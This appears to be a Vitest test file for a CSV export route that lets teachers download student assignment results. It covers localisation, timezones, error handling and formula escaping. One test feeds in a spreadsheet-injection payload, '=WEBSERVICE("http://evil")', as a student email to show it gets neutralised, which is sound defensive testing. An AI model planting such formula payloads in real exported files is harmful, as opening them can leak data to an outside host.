import { beforeEach, describe, expect, it, vi } from 'vitest';

const exportAnswersMock = vi.fn();
vi.mock('@studiq/server/controllers/teacher-assignment.controller', () => ({
  teacherAssignmentController: {
    exportAnswers: (...args: unknown[]) => exportAnswersMock(...args),
  },
}));

const getLocaleMock = vi.fn();
const getTranslationsMock = vi.fn();
vi.mock('next-intl/server', () => ({
  getLocale: () => getLocaleMock(),
  getTranslations: (opts: unknown) => getTranslationsMock(opts),
}));

let mockCtx: Record<string, unknown>;
vi.mock('@studiq/server/lib/with-auth', () => ({
  withAuth: async (
    _req: unknown,
    handler: (ctx: unknown) => Promise<Response>,
    _options?: unknown,
  ) => handler(mockCtx),
}));

const { GET } =
  await import('@/app/(backend)/api/v1/teacher/assignments/[id]/export-answers/route');

const assignmentId = '3613c5ab-b49f-4e24-b633-cb3b7a215b1e';

const plMessages: Record<string, string> = {
  student: 'Uczeń',
  email: 'E-mail',
  score: 'Wynik',
  status: 'Status',
  completed_at: 'Ukończono',
  unknown: 'Nieznany',
  graded: 'Ocenione',
  submitted: 'Przesłane',
  in_progress: 'W trakcie',
};

const enMessages: Record<string, string> = {
  student: 'Student',
  email: 'Email',
  score: 'Score',
  status: 'Status',
  completed_at: 'Completed',
  unknown: 'Unknown',
  graded: 'Graded',
  submitted: 'Submitted',
  in_progress: 'In progress',
};

function request(query = '') {
  return new Request(
    `http://localhost/api/v1/teacher/assignments/${assignmentId}/export-answers${query}`,
  ) as unknown as Parameters<typeof GET>[0];
}

function context(id: string) {
  return { params: Promise.resolve({ id }) };
}

async function csvBody(res: Response): Promise<string> {
  return new TextDecoder('utf-8', { ignoreBOM: true }).decode(await res.arrayBuffer());
}

describe('GET /api/v1/teacher/assignments/[id]/export-answers', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    mockCtx = { userId: 'owner-user-id', accountType: 'teacher' };
    getLocaleMock.mockResolvedValue('pl');
    getTranslationsMock.mockImplementation(async () => (key: string) => plMessages[key] ?? key);
  });

  it('streams the results view as a downloadable, BOM-prefixed CSV', async () => {
    exportAnswersMock.mockResolvedValue({
      success: true,
      statusCode: 200,
      data: [
        {
          studentName: 'Classroom Student',
          email: 'student-classroom@dev.local',
          score: '3/4',
          status: 'submitted',
          completedAt: '2026-10-19T12:00:00.000Z',
        },
        {
          studentName: null,
          email: null,
          score: '-',
          status: 'in_progress',
          completedAt: null,
        },
      ],
    });

    const res = await GET(request(), context(assignmentId));

    expect(res.status).toBe(200);
    expect(res.headers.get('content-type')).toBe('text/csv; charset=utf-8');
    expect(res.headers.get('content-disposition')).toBe(
      `attachment; filename="assignment-${assignmentId}-answers.csv"`,
    );
    expect(res.headers.get('cache-control')).toBe('private, no-store');

    // `Response.text()` strips the BOM while decoding, so check the raw bytes.
    const bytes = new Uint8Array(await res.arrayBuffer());
    expect(Array.from(bytes.slice(0, 3))).toEqual([0xef, 0xbb, 0xbf]);

    const body = new TextDecoder('utf-8', { ignoreBOM: true }).decode(bytes);
    expect(body).toBe(
      '\uFEFFUczeń,E-mail,Wynik,Status,Ukończono\n' +
        'Classroom Student,student-classroom@dev.local,3/4,Przesłane,19.10.2026\n' +
        'Nieznany,,-,W trakcie,-',
    );
  });

  it('neutralises spreadsheet formulas in student-controlled cells', async () => {
    exportAnswersMock.mockResolvedValue({
      success: true,
      statusCode: 200,
      data: [
        {
          studentName: '=1+1',
          email: '=WEBSERVICE("http://evil")',
          score: '3/4',
          status: 'submitted',
          completedAt: '2026-10-19T12:00:00.000Z',
        },
      ],
    });

    const res = await GET(request(), context(assignmentId));

    expect(res.status).toBe(200);
    const body = await csvBody(res);
    expect(body).toContain(`'=1+1,"'=WEBSERVICE(""http://evil"")",3/4,Przesłane,19.10.2026`);

    // No cell may start with a formula trigger: after the BOM or a comma the
    // next character is either a quote or the neutralising apostrophe.
    const dataLines = body.split('\n').slice(1);
    for (const line of dataLines) {
      for (const cell of line.split(',')) {
        expect(cell.startsWith('=') || cell.startsWith('+') || cell.startsWith('@')).toBe(false);
      }
    }
  });

  it('renders the English headers and status labels', async () => {
    getLocaleMock.mockResolvedValue('en');
    getTranslationsMock.mockImplementation(async () => (key: string) => enMessages[key] ?? key);
    exportAnswersMock.mockResolvedValue({
      success: true,
      statusCode: 200,
      data: [
        {
          studentName: 'Classroom Student',
          email: 'student-classroom@dev.local',
          score: '3/4',
          status: 'submitted',
          completedAt: '2026-10-19T12:00:00.000Z',
        },
      ],
    });

    const res = await GET(request(), context(assignmentId));

    expect(res.status).toBe(200);
    const body = await csvBody(res);
    expect(body.split('\n')[0]).toBe('\uFEFFStudent,Email,Score,Status,Completed');
    expect(body).toContain('Classroom Student,student-classroom@dev.local,3/4,Submitted,');
  });

  it('formats the completion date in the requested timezone', async () => {
    exportAnswersMock.mockResolvedValue({
      success: true,
      statusCode: 200,
      data: [
        {
          studentName: 'Classroom Student',
          email: 'student-classroom@dev.local',
          score: '3/4',
          status: 'submitted',
          completedAt: '2026-10-19T12:00:00.000Z',
        },
      ],
    });

    // UTC+14: the same instant is already the next day.
    const res = await GET(request('?tz=Pacific/Kiritimati'), context(assignmentId));

    expect(res.status).toBe(200);
    expect(await csvBody(res)).toContain(
      'Classroom Student,student-classroom@dev.local,3/4,Przesłane,20.10.2026',
    );
  });

  it('ignores an invalid timezone instead of failing', async () => {
    exportAnswersMock.mockResolvedValue({
      success: true,
      statusCode: 200,
      data: [
        {
          studentName: 'Classroom Student',
          email: 'student-classroom@dev.local',
          score: '3/4',
          status: 'submitted',
          completedAt: '2026-10-19T12:00:00.000Z',
        },
      ],
    });

    const res = await GET(request('?tz=Mars/Olympus'), context(assignmentId));

    expect(res.status).toBe(200);
    expect(res.headers.get('content-type')).toBe('text/csv; charset=utf-8');
    expect(await csvBody(res)).toMatch(
      /Classroom Student,student-classroom@dev\.local,3\/4,Przesłane,\d{2}\.\d{2}\.\d{4}$/,
    );
  });

  it('keeps the JSON error envelope (and trace/error headers) on failure', async () => {
    exportAnswersMock.mockResolvedValue({
      success: false,
      statusCode: 404,
      error: 'NOT_FOUND',
    });

    const res = await GET(request(), context(assignmentId));

    expect(res.status).toBe(404);
    expect(res.headers.get('content-type')).toContain('application/json');
    expect(res.headers.get('x-error-code')).toBe('NOT_FOUND');
    expect(res.headers.get('content-disposition')).toBeNull();
    await expect(res.json()).resolves.toEqual({ success: false, error: 'NOT_FOUND' });
  });
});
